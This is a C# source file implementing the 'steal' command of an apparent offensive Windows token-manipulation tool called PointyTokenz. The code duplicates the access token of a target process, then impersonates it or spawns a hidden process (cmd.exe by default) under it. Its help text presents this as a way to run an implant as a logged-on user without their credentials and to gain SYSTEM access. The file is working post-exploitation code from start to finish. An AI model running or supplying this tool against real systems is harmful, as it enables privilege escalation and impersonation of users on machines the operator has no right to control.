using Windows.Win32.Foundation;
using Windows.Win32.Security;
using Windows.Win32.System.Threading;
using Microsoft.Win32.SafeHandles;
using System.Runtime.InteropServices;
using PointyTokenz.Domain;
using System.Security.Principal;

using static Windows.Win32.PInvoke;
using static PointyTokenz.Domain.Helpers;


namespace PointyTokenz.Commands
{
    public class Steal : ICommand
    {
        public static string CommandName => "steal";
        private WindowStationDACL? stationDaclObj;

        public unsafe void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("\r\n[*] Command: steal\r\n");

            // Check if the /pid argument is present    
            if (!arguments.ContainsKey("/pid") || arguments.ContainsKey("/help"))
            {
                Console.WriteLine("Action:");
                Console.WriteLine(" Steal the primary access token of a target process, duplicate it, and impersonate it.");
                Console.WriteLine(" If the /spawn argument is present, then attempt to spawn a process with the stolen token instead.\r\n");
                Console.WriteLine(" IMPORTANT NOTE: Without /spawn, it will impersonate the token in the current thread, which may do wonky things, especially inside an implant.\r");
                Console.WriteLine("     You probably want /spawn in most cases, but I left a placeholder to insert some logic in the case of impersonation.\r\n");

                Console.WriteLine("Requirements:");
                Console.WriteLine(" The calling process must be running in High Integrity and have SeDebugPrivilege. Some processes still won't be \"stealable\" due to permissions and ownership.");
                Console.WriteLine(" Spawning a process using CreateProcessWithToken (default) requires the SeImpersonatePrivilege privilege.");
                Console.WriteLine(" If that call fails, CreateProcessAsUser will be used as a fallback, which requires SeIncreaseQuotaPrivilege and SeAssignPrimaryTokenPrivilege. (not much testing of this was done)\r\n");

                Console.WriteLine("Purpose:");
                Console.WriteLine(" Useful for running a command/implant as a logged-on user without knowing their credentials.");
                Console.WriteLine(" It can also be used to get SYSTEM access by stealing the token of a SYSTEM process.\r\n");

                Console.WriteLine("Options:");
                Console.WriteLine(" /pid:<pid>        - The process ID to steal the access token from. (required)");
                Console.WriteLine(" /spawn:<program>  - The command to spawn as the impersonated user (optional - defaults to cmd.exe)");
                Console.WriteLine(" /tokentype:<type> - The type of token to steal. (optional, defaults to Primary)");
                Console.WriteLine(" /netonly          - Use LOGON_NETCREDENTIALS_ONLY for the spawned process. (optional)");
                Console.WriteLine(" /help             - Show this help message.\r\n");

                Console.WriteLine("Supported token types:");
                Console.WriteLine(" Primary        - TokenPrimary (default)");
                Console.WriteLine(" Impersonation  - TokenImpersonation\r\n");

                return;
            }

            // Parse the PID from the arguments
            string pidString = arguments["/pid"];

            // Check if the PID is a valid integer
            if (int.TryParse(pidString, out int pid) == false)
            {
                Console.WriteLine("[x] The /pid argument must be a valid integer.");
                return;
            }

            // Getting the /tokentype argument from the input
            string tokenType = arguments.ContainsKey("/tokentype") ? arguments["/tokentype"] : "Primary";  // Default to "Primary" if not present

            // Validate the tokenType
            if (tokenType.Equals("Primary", StringComparison.OrdinalIgnoreCase))
            {
                tokenType = "Primary";  // This will be true if the argument is "Primary"
            }
            else if (tokenType.Equals("Impersonation", StringComparison.OrdinalIgnoreCase))
            {
                tokenType = "Impersonation";  // This will be true if the argument is "Impersonation"
            }
            else
            {
                Console.WriteLine("[x] Invalid /tokentype value. Supported values are 'Primary' and 'Impersonation'.");
                return;
            }

            // Open the process with the PROCESS_QUERY_LIMITED_INFORMATION access right 
            HANDLE hProcess = OpenProcess(PROCESS_ACCESS_RIGHTS.PROCESS_QUERY_LIMITED_INFORMATION, false, (uint)pid);
            if (hProcess.IsNull)
            {
                Console.WriteLine($"[x] Failed to open process {pid} : {Marshal.GetLastWin32Error()}");
                return;
            }

            // Convert HANDLE to SafeFileHandle
            SafeFileHandle safeProcessHandle = new SafeFileHandle(hProcess, true);

            // Print the session ID of the target process
            if (!ProcessIdToSessionId((uint)pid, out uint sessionId))
            {
                Console.WriteLine($"[x] Failed to get session ID of process {pid} : {Marshal.GetLastWin32Error()}");
                safeProcessHandle.Close();
                return;
            }

            Console.WriteLine($"[*] Target process ID {pid} is running in session ID {sessionId}");

            // Open the process token
            SafeFileHandle hToken;
            if (!OpenProcessToken(safeProcessHandle, TOKEN_ACCESS_MASK.TOKEN_DUPLICATE, out hToken))
            {
                Console.WriteLine($"[x] Failed to open process token : {Marshal.GetLastWin32Error()}");
                safeProcessHandle.Close();
                return;
            }

            // Determine if we're duplicating into a primary or impersonation token
            bool isPrimary = (tokenType == "Primary");

            // Correctly assign token type
            TOKEN_TYPE tokenTypeDuplicate = isPrimary ? TOKEN_TYPE.TokenPrimary : TOKEN_TYPE.TokenImpersonation;

            // Assign impersonation level correctly (only matters for impersonation tokens)
            SECURITY_IMPERSONATION_LEVEL impersonationLevel = isPrimary ? 0 : SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation;

            // Select the proper token access rights, depending on the token type

            // If tokenType is Primary, we need TOKEN_QUERY and TOKEN_DUPLICATE. If tokenType is Impersonation, we need TOKEN_QUERY and TOKEN_IMPERSONATE
            //TOKEN_ACCESS_MASK tokenAccessRights = isPrimary
            //   ? TOKEN_ACCESS_MASK.TOKEN_QUERY | TOKEN_ACCESS_MASK.TOKEN_DUPLICATE | TOKEN_ACCESS_MASK.TOKEN_ASSIGN_PRIMARY // Primary token
            //    : TOKEN_ACCESS_MASK.TOKEN_QUERY | TOKEN_ACCESS_MASK.TOKEN_IMPERSONATE; // Impersonation token

            // Duplicate the token into the specified type (primary or impersonation), with the specified access rights, and the specified impersonation level
            SafeFileHandle dupedToken;

            /* It seems that when passing an impersonation token to CreateProcessWithToken, it works even though the documentation states it needs a primary token, but it needs more permissions
            It seems CreateProcessAsUser happily takes a Primary token if permissions are set to TOKEN_ACCESS_MASK.TOKEN_QUERY | TOKEN_ACCESS_MASK.TOKEN_DUPLICATE | TOKEN_ACCESS_MASK.TOKEN_ASSIGN_PRIMARY
            It doesnt like TOKEN_ACCESS_MASK.TOKEN_QUERY | TOKEN_ACCESS_MASK.TOKEN_IMPERSONATE when passing an Impersonation token

            As for CreateProcessWithToken, its not happy with a Primary token with TOKEN_ACCESS_MASK.TOKEN_QUERY | TOKEN_ACCESS_MASK.TOKEN_DUPLICATE | TOKEN_ACCESS_MASK.TOKEN_ASSIGN_PRIMARY
            It is not happy either with an Impersonation token with TOKEN_ACCESS_MASK.TOKEN_QUERY | TOKEN_ACCESS_MASK.TOKEN_IMPERSONATE
            
            It looks easier to simply use TOKEN_ALL_ACCESS for everything even if its bad practice? maybe to be fixed later
            */
            TOKEN_ACCESS_MASK tokenAccessRights = TOKEN_ACCESS_MASK.TOKEN_ALL_ACCESS;

            if (!DuplicateTokenEx(hToken, tokenAccessRights, new SECURITY_ATTRIBUTES(), impersonationLevel, tokenTypeDuplicate, out dupedToken))
            {
                Console.WriteLine($"[x] Failed to duplicate token : {Marshal.GetLastWin32Error()}");
                hToken.Close();
                safeProcessHandle.Close();
                return;
            }

            // Get the token statistics
            Helpers.TokenInfo(dupedToken, TOKEN_INFORMATION_CLASS.TokenStatistics, out TOKEN_STATISTICS tokenStats);

            // Get the token user, repeating code from Enumerate but oh well
            // Call the Helper function to get the token information for the TokerUser class
            SecurityIdentifier? sid = null;
            NTAccount? user = null;

            // Get the TOKEN_USER structure using the helper function
            if (Helpers.TokenInfo(dupedToken, TOKEN_INFORMATION_CLASS.TokenUser, out TOKEN_USER tokenUser))
            {
                // Getting the user's SID and translating it to an NTAccount
                sid = new SecurityIdentifier(tokenUser.User.Sid);
                user = (NTAccount)sid.Translate(typeof(NTAccount));
            }
            else
            {
                Console.WriteLine("[x] Failed to retrieve token user information.");
            }

            // Print a message indicating the token was successfully duplicated
            Console.WriteLine($"[*] Successfully duplicated token of process ID {pid}");
            Console.WriteLine("     User                : {0}", user);
            Console.WriteLine("     User SID            : {0}", sid);
            Console.WriteLine("     Token Type          : {0}", tokenStats.TokenType);
            Console.WriteLine("     Impersonation Level : {0}\r\n", tokenStats.TokenType is TOKEN_TYPE.TokenImpersonation ? tokenStats.ImpersonationLevel : "N/A");

            // If /spawn is specified, spawn a new process with the token
            if (arguments.ContainsKey("/spawn"))
            {
                // Check if /spawn exists and is not empty, otherwise default to cmd.exe
                string commandLine = arguments.TryGetValue("/spawn", out string? spawnArg) && !string.IsNullOrWhiteSpace(spawnArg)
                    ? spawnArg
                    : "C:\\Windows\\System32\\cmd.exe";

                // Create a null-terminated char array
                char[] commandLineBuffer = new char[commandLine.Length + 1];

                // Copy the command string into the array
                commandLine.AsSpan().CopyTo(commandLineBuffer);

                // Span<char> wrapping the buffer (null terminator is already there as default)
                Span<char> commandLineSpan = commandLineBuffer;

                // Convert user to a string, extract domain and user
                string[] userParts = user.ToString().Split('\\');
                string domain = userParts[0];
                string username = userParts[1];

                // ----------
                // straight out stolen from RunAsCs https://github.com/antonioCoco/RunasCs/blob/master/RunasCs.cs
                // add the proper DACL on the window station and desktop that will be used - we are passing an arbitrary logon type here since we are not actually logging in, not sure how dumb that is
                this.stationDaclObj = new WindowStationDACL();
                string desktopName = this.stationDaclObj.AddAclToActiveWindowStation(domain, username, (int)LOGON32_LOGON.LOGON32_LOGON_INTERACTIVE);
                // ----------

                // Define the STARTUPINFO and PROCESS_INFORMATION structs
                var startInfo = new STARTUPINFOW
                {
                    dwFlags = STARTUPINFOW_FLAGS.STARTF_USESHOWWINDOW,
                    wShowWindow = 0, // SW_HIDE
                                     //lpStartInfo.wShowWindow = 5; // SW_SHOW, required for GUI apps?
                    lpDesktop = new PWSTR(Marshal.StringToCoTaskMemUni(desktopName)),
                    cb = (uint)Marshal.SizeOf<STARTUPINFOW>()
                };

                var processInfo = new PROCESS_INFORMATION();
                string spawnMethod = "CreateProcessWithToken";

                // Set the logon flag, depending on the /netonly argument
                CREATE_PROCESS_LOGON_FLAGS logonFlags = CREATE_PROCESS_LOGON_FLAGS.LOGON_WITH_PROFILE;
                if (arguments.ContainsKey("/netonly"))
                {
                    Console.WriteLine("[*] /netonly argument specified, using LOGON_NETCREDENTIALS_ONLY\r\n");
                    logonFlags = CREATE_PROCESS_LOGON_FLAGS.LOGON_NETCREDENTIALS_ONLY;

                }
                else
                {
                    Console.WriteLine("[*] /netonly argument not specified, using LOGON_WITH_PROFILE\r\n");
                }

                // Make sure we have SeImpersonatePrivilege for the current process
                if (!Helpers.EnablePrivilege("SeImpersonatePrivilege"))
                {
                    Console.WriteLine("[x] Failed to enable SeImpersonatePrivilege");
                    return;
                }

                // Spawn a new process with the token using CreateProcessWithToken, documentation states it needs a Primary token, but it works with an Impersonation token as well??!!
                if (!CreateProcessWithToken(dupedToken, logonFlags, null, ref commandLineSpan, PROCESS_CREATION_FLAGS.CREATE_NO_WINDOW, null, null, startInfo, out processInfo))
                {
                    Console.WriteLine($"[x] Failed to spawn the process with CreateProcessWithToken : {Marshal.GetLastWin32Error()}\n");

                    // If CreateProcessWithToken fails, try CreateProcessAsUser
                    // Enabling the required privileges for CreateProcessAsUser in our own token
                    Console.WriteLine("[!] Falling back to CreateProcessAsUser - enabling the required privileges");

                    if (!Helpers.EnablePrivilege("SeAssignPrimaryTokenPrivilege") || !Helpers.EnablePrivilege("SeIncreaseQuotaPrivilege"))
                    {
                        Console.WriteLine("\n[x] Failed to enable the required privileges for CreateProcessAsUser");
                        return;
                    }

                    // Fallback - Spawn a new process with the token using CreateProcessAsUser, documentation states it needs a Primary token, but it works with an Impersonation token as well??!!
                    spawnMethod = "CreateProcessAsUser";

                    // We redefine the span here because the previous one is not valid anymore it seems? 
                    commandLineSpan = commandLineBuffer;

                    if (!CreateProcessAsUser(dupedToken, null, ref commandLineSpan, null, null, false, PROCESS_CREATION_FLAGS.CREATE_NO_WINDOW, null, null, startInfo, out processInfo))
                    {
                        Console.WriteLine($"\n[x] Failed to spawn the process with CreateProcessAsUser : {Marshal.GetLastWin32Error()}");
                        return;
                    }
                }

                // Print a success message
                Console.WriteLine("[*] Successfully spawned {0} with the duplicated token using {1}", commandLine, spawnMethod);
                Console.WriteLine("     Process ID : {0}", processInfo.dwProcessId);
                Console.WriteLine("     Thread ID  : {0}", processInfo.dwThreadId);
            }
            else
            {
                // Print a message if we dont have /spawn, this is mostly placeholder code
                Console.WriteLine("[*] Token created and duplicated, but no /spawn argument specified to spawn a process.");

                // Impersonate the token
                if (!ImpersonateLoggedOnUser(dupedToken))
                {
                    Console.WriteLine($"[x] Failed to impersonate the token : {Marshal.GetLastWin32Error()}");
                    dupedToken.Close();
                    hToken.Close();
                    safeProcessHandle.Close();
                    return;
                }

                else
                {
                    Console.WriteLine("[*] Successfully impersonated the token of process ID {0}", pid);


                    /* --Could implement code to run with the impersonated token here
                     *  
                     *  
                     * 
                    */
                }
            }
                // Cleanup
                dupedToken.Close();
                hToken.Close();
                safeProcessHandle.Close();
        }
    }
}
